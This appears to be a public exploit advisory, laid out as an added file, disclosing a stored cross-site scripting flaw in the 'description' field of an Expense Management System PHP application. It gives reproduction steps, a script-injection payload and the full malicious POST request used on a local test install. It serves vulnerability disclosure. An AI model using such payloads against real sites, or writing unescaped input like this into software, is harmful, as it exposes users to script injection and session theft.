@@ -1,0 +1,39 @@
+# Exploit Title: Expense Management System - 'description' Stored Cross Site Scripting
+# Date: 02/12/2020
+# Exploit Author: Nikhil Kumar
+# Vendor Homepage: http://egavilanmedia.com/
+# Software Link: http://egavilanmedia.com/expense-management-system/
+# Tested On: Ubuntu
+
+Vunerable Parameter: "description="
+
+Steps to Reproduce:
+
+1. Open the index.php page using following url 
+
+http://localhost/Expense-Management-System/index.php
+
+click on Add Expense
+
+2. Put a payload on "description=" parameter
+
+Payload :- test"><script>alert("XSS")</script>
+
+Malicious Request::
+
+POST /Expense-Management-System/expense_action.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 140
+Origin: http://localhost
+DNT: 1
+Connection: close
+Referer: http://localhost/Expense-Management-System/
+Cookie: PHPSESSID=45f122ec98900409467ac74f6113ff4a
+
+description=test%22%3E%3Cscript%3Ealert("XSS")%3C%2Fscript%3E&amount=1234&date=2020%2F11%2F17&expense_id=&action=Add
